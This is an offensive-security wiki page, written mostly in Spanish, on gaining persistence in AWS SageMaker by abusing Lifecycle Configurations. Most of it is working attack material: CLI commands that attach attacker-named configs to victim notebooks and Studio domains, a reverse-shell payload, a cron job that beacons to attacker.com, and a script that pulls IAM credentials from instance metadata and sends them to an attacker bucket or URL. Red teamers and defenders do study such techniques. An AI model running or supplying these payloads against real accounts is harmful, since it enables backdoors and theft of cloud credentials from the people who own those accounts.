# AWS - SageMaker Lifecycle Configuration Persistence

## Overview of Persistence Techniques

Esta sección describe métodos para obtener persistencia en SageMaker abusando de las Configuraciones de Ciclo de Vida (LCCs), incluyendo shells inversos, trabajos cron, robo de credenciales a través de IMDS y puertas traseras SSH. Estos scripts se ejecutan con el rol IAM de la instancia y pueden persistir a través de reinicios. La mayoría de las técnicas requieren acceso a la red saliente, pero el uso de servicios en el plano de control de AWS aún puede permitir el éxito si el entorno está en modo 'VPC-only'.
#### Nota: Las instancias de cuadernos de SageMaker son esencialmente instancias EC2 gestionadas configuradas específicamente para cargas de trabajo de aprendizaje automático.

## Required Permissions
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Aplicaciones de Studio:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## Configurar la Configuración del Ciclo de Vida en Instancias de Notebook

### Ejemplo de Comandos de AWS CLI:
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## Configuración del Ciclo de Vida en SageMaker Studio

Las Configuraciones del Ciclo de Vida se pueden adjuntar a varios niveles y a diferentes tipos de aplicaciones dentro de SageMaker Studio.

### Nivel de Dominio de Studio (Todos los Usuarios)
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Nivel de Espacio de Estudio (Espacios Individuales o Compartidos)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Tipos de Configuraciones del Ciclo de Vida de la Aplicación de Studio

Las configuraciones del ciclo de vida se pueden aplicar específicamente a diferentes tipos de aplicaciones de SageMaker Studio:
* JupyterServer: Ejecuta scripts durante el inicio del servidor Jupyter, ideal para mecanismos de persistencia como shells inversos y trabajos cron.
* KernelGateway: Se ejecuta durante el lanzamiento de la aplicación del gateway de kernel, útil para la configuración inicial o el acceso persistente.
* CodeEditor: Se aplica al Editor de Código (Code-OSS), habilitando scripts que se ejecutan al inicio de las sesiones de edición de código.

### Comando de Ejemplo para Cada Tipo:

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### CodeEditor
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### Información Crítica:
* Adjuntar LCCs a nivel de dominio o espacio impacta a todos los usuarios o aplicaciones dentro del alcance.
* Requiere permisos más altos (sagemaker:UpdateDomain, sagemaker:UpdateSpace) que típicamente son más factibles a nivel de espacio que a nivel de dominio.
* Controles a nivel de red (por ejemplo, filtrado de salida estricto) pueden prevenir shells reversos exitosos o exfiltración de datos.

## Shell Reverso a través de Configuración de Ciclo de Vida

Las Configuraciones de Ciclo de Vida de SageMaker (LCCs) ejecutan scripts personalizados cuando las instancias de notebook se inician. Un atacante con permisos puede establecer un shell reverso persistente.

### Ejemplo de Payload:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## Persistencia de Cron Job a través de la Configuración del Ciclo de Vida

Un atacante puede inyectar trabajos cron a través de scripts de LCC, asegurando la ejecución periódica de scripts o comandos maliciosos, lo que permite una persistencia sigilosa.

### Ejemplo de Payload:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## Exfiltración de Credenciales a través de IMDS (v1 y v2)

Las configuraciones de ciclo de vida pueden consultar el Servicio de Metadatos de Instancia (IMDS) para recuperar credenciales de IAM y exfiltrarlas a una ubicación controlada por el atacante.

### Ejemplo de Payload:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```

